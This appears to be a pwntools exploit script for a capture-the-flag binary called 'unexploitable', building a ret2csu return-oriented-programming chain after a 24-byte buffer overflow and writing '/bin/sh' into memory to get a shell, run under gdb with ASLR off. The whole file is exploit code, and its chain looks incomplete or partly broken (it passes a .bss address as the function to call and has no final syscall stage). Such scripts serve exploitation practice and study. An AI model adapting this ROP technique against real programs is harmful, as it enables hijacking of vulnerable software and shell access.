from pwn import *

csu_set = 0x4005e6
csu_call = 0x4005d0
main_addr = 0x400544
syscall_addr = 0x400560
read_got = 0x601000
sleep_got = 0x601010

bss = 0x601000
binsh = bss + 0x28 # 0x601028
rax_dummy = bss + 0x38 # 0x601038

def chain(func, arg1, arg2, arg3):
    payload = p64(0)
    payload += p64(0)
    payload += p64(1)
    payload += p64(func)
    payload += p64(arg1)
    payload += p64(arg2)
    payload += p64(arg3)

    payload += p64(csu_call)

    return payload

r = gdb.debug(f"./unexploitable", aslr=False,gdbscript="b *0x4005d0")

sleep (3)

payload = b"A"*24 + p64(csu_set) + chain(bss, 0, binsh, 0x8) + p64(main_addr)*10
r.send(payload)

sleep (0.5)

r.send("/bin/sh\x00")

sleep (1000)
